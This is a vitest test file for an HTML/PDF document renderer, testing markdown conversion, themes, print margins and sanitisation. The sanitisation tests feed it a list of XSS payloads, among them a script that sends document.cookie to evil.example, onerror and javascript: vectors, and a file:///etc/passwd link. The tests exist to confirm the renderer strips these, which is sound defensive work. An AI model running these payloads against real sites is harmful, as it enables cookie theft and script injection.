import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { renderDocument, markdownToHtml, escapeHtml, printOptionsForTheme, constrainGeneratedHtml } from './render';
import { DOCUMENT_THEMES, themeIds, getTheme, describeThemes } from './themes';

/**
 * The security property is the important one and is asserted as a property, not
 * just as cases: the rendered document is loaded into a real browser context to
 * be printed, so an executable tag reaching the output is a live vulnerability
 * rather than a cosmetic bug.
 */

describe('markdown conversion', () => {
  it('renders the ordinary constructs', () => {
    const html = markdownToHtml('# H\n\nsome **bold** and `code`\n\n- a\n- b\n');
    expect(html).toContain('<h1');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>a</li>');
  });

  it('renders GFM tables', () => {
    const html = markdownToHtml('| a | b |\n|---|---|\n| 1 | 2 |\n');
    expect(html).toContain('<table>');
    expect(html).toContain('<td>1</td>');
  });

  it('returns empty for empty input', () => {
    expect(markdownToHtml('')).toBe('');
    expect(markdownToHtml('   ')).toBe('');
    expect(markdownToHtml(undefined as unknown as string)).toBe('');
  });
});

describe('escapeHtml', () => {
  it('escapes every character that can break out of text or an attribute', () => {
    expect(escapeHtml(`<a href="x" onclick='y'>&`)).toBe(
      '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;',
    );
  });

  it('escapes ampersands first, so entities are not double-broken', () => {
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });
});

describe('renderDocument — no executable content survives', () => {
  const payloads = [
    '<script>fetch("https://evil.example?c="+document.cookie)</script>',
    '<img src=x onerror="alert(1)">',
    '<iframe src="https://evil.example"></iframe>',
    '<svg onload="alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<style>body{display:none}</style>',
    '<object data="evil"></object>',
    '</style><script>alert(1)</script>',
  ];

  it.each(payloads)('neutralises %s in the body', (payload) => {
    const html = renderDocument({ title: 'T', markdown: payload });

    // The real property is that no RAW tag from the payload survives. Grepping
    // for "onerror=" alone is wrong: it appears inside fully escaped text
    // (&lt;img src=x onerror=&quot;…&quot;&gt;), which is inert.
    const bodyOnly = html.slice(html.indexOf('<body>'));
    for (const tag of ['<script', '<iframe', '<img', '<svg', '<object', '<style']) {
      expect(bodyOnly.toLowerCase(), `raw ${tag} survived`).not.toContain(tag);
    }
    // …and the user still sees what was written, as text
    expect(html).toContain('&lt;');
  });

  it('neutralises a payload in the title', () => {
    const html = renderDocument({ title: '</title><script>alert(1)</script>', markdown: 'x' });
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('</title><');
  });

  it('neutralises a payload in the subtitle and footer', () => {
    const html = renderDocument({
      title: 'T',
      markdown: 'x',
      subtitle: '<script>a</script>',
      footer: '<script>b</script>',
    });
    expect(html).not.toContain('<script>');
  });

  it('property: no script tag or inline handler ever reaches the output', () => {
    fc.assert(
      fc.property(fc.string(), fc.string(), fc.string(), (title, markdown, subtitle) => {
        const html = renderDocument({ title, markdown, subtitle });
        // Only the BODY matters — the head legitimately contains a <style>.
        const body = html.slice(html.indexOf('<body>')).toLowerCase();
        for (const tag of ['<script', '<iframe', '<object', '<embed', '<img', '<svg', '<link', '<style']) {
          expect(body, `raw ${tag}`).not.toContain(tag);
        }
        expect(body).not.toContain('javascript:');
      }),
      { numRuns: 1000 },
    );
  });
});

describe('renderDocument — structure', () => {
  it('produces a standalone document with no external requests', () => {
    const html = renderDocument({ title: 'Q3 Report', markdown: '## Overview\n\ntext\n' });
    expect(html.startsWith('<!DOCTYPE html>')).toBe(true);
    expect(html).toContain('<title>Q3 Report</title>');
    // everything inline: printing must be deterministic and work offline
    expect(html).not.toContain('<link ');
    expect(html).not.toContain('src="http');
    expect(html).not.toContain('@import');
  });

  it('renders the title, subtitle and body', () => {
    const html = renderDocument({
      title: 'Title',
      subtitle: '27 July 2026',
      markdown: '## Section\n\nBody text.\n',
    });
    expect(html).toContain('class="doc-title">Title<');
    expect(html).toContain('27 July 2026');
    expect(html).toContain('Body text.');
  });

  it('omits the subtitle block when there is none', () => {
    // The CLASS is always defined in the stylesheet; it is the ELEMENT that must
    // be absent.
    expect(renderDocument({ title: 'T', markdown: 'x' })).not.toContain('<p class="doc-meta">');
  });

  it('falls back to a title rather than rendering an empty heading', () => {
    expect(renderDocument({ title: '', markdown: 'x' })).toContain('Untitled');
  });

  it('handles an empty body without producing malformed HTML', () => {
    const html = renderDocument({ title: 'T', markdown: '' });
    expect(html).toContain('</body>');
    expect(html).toContain('<title>T</title>');
  });

  it('sets the page size and margins from the theme', () => {
    const html = renderDocument({ title: 'T', markdown: 'x', theme: 'proposal' });
    expect(html).toContain('size: A4');
    expect(html).toContain('margin: 24mm');
  });

  it('avoids splitting code blocks and table rows across pages', () => {
    // A listing cut in half is unreadable; hand-rolled generators never do this.
    const html = renderDocument({ title: 'T', markdown: '```\ncode\n```' });
    expect(html).toContain('page-break-inside: avoid');
  });
});

describe('themes', () => {
  it('exposes four themes, each with a description for the model', () => {
    expect(themeIds()).toEqual(['report', 'memo', 'proposal', 'plain']);
    for (const id of themeIds()) {
      expect(DOCUMENT_THEMES[id].description.length, id).toBeGreaterThan(20);
    }
  });

  it('falls back to the default for an unknown or missing id', () => {
    expect(getTheme('nonsense').id).toBe('report');
    expect(getTheme(undefined).id).toBe('report');
    expect(getTheme(42).id).toBe('report');
  });

  it('every theme defines all the variables the base stylesheet consumes', () => {
    const required = [
      '--body-font', '--heading-font', '--mono-font', '--body-size',
      '--h1-size', '--h2-size', '--h3-size',
      '--ink', '--heading-ink', '--muted', '--accent', '--rule', '--rule-soft',
    ];
    for (const id of themeIds()) {
      for (const v of required) {
        expect(DOCUMENT_THEMES[id].css, `${id} missing ${v}`).toContain(`${v}:`);
      }
    }
  });

  it('uses only system fonts, so nothing is fetched at print time', () => {
    for (const id of themeIds()) {
      expect(DOCUMENT_THEMES[id].css, id).not.toContain('@font-face');
      expect(DOCUMENT_THEMES[id].css, id).not.toContain('fonts.googleapis');
    }
  });

  it('describeThemes lists every id for the tool description', () => {
    const described = describeThemes();
    for (const id of themeIds()) expect(described).toContain(`"${id}"`);
  });
});

describe('printOptionsForTheme', () => {
  it('converts millimetre margins to the inches printToPDF expects', () => {
    const opts = printOptionsForTheme('proposal');
    expect(opts.pageSize).toBe('A4');
    expect(opts.margins.top).toBeCloseTo(24 / 25.4, 5);
  });

  it('keeps backgrounds on, or the theme would not appear', () => {
    // Rules, table shading and code blocks are all backgrounds.
    for (const id of themeIds()) {
      expect(printOptionsForTheme(id).printBackground, id).toBe(true);
    }
  });

  it('falls back safely for an unknown theme', () => {
    expect(printOptionsForTheme('nope').pageSize).toBe('A4');
  });
});

describe('constrainGeneratedHtml — markdown\'s own network-reaching output', () => {
  it('drops a remote image, which would be fetched while printing', () => {
    // A slow or dead host yields a blank box, and the request leaks that the
    // document was printed, and when.
    const html = renderDocument({ title: 'T', markdown: '![alt](https://evil.example/p.png)' });
    expect(html.slice(html.indexOf('<body>'))).not.toContain('<img');
    expect(html).not.toContain('evil.example/p.png');
  });

  it('keeps an inline data-URL image', () => {
    const md = '![dot](data:image/gif;base64,R0lGODlhAQABAAAAACw=)';
    const html = renderDocument({ title: 'T', markdown: md });
    expect(html.slice(html.indexOf('<body>'))).toContain('<img');
  });

  it('keeps ordinary http and https links — a document should have links', () => {
    const html = renderDocument({ title: 'T', markdown: '[docs](https://example.com/a)' });
    expect(html).toContain('href="https://example.com/a"');
  });

  it('strips the href from a javascript: link', () => {
    const html = renderDocument({ title: 'T', markdown: '[x](javascript:alert(1))' });
    expect(html).not.toContain('javascript:');
    // the text survives, so the reader still sees what was written
    expect(html).toContain('x</a>');
  });

  it('strips other dangerous schemes', () => {
    for (const scheme of ['data:text/html,<script>a</script>', 'vbscript:msgbox', 'file:///etc/passwd']) {
      const html = renderDocument({ title: 'T', markdown: `[x](${scheme})` });
      expect(html.toLowerCase(), scheme).not.toContain('href="vbscript');
      expect(html.toLowerCase(), scheme).not.toContain('href="file:');
      expect(html.toLowerCase(), scheme).not.toContain('href="data:text/html');
    }
  });

  it('property: no body link ever carries a non-web scheme', () => {
    fc.assert(
      fc.property(fc.string(), (markdown) => {
        const html = renderDocument({ title: 'T', markdown });
        const body = html.slice(html.indexOf('<body>'));
        for (const m of body.matchAll(/href="([^"]*)"/gi)) {
          expect(m[1]).toMatch(/^(https?:|mailto:|#|\/)/i);
        }
      }),
      { numRuns: 1000 },
    );
  });
});
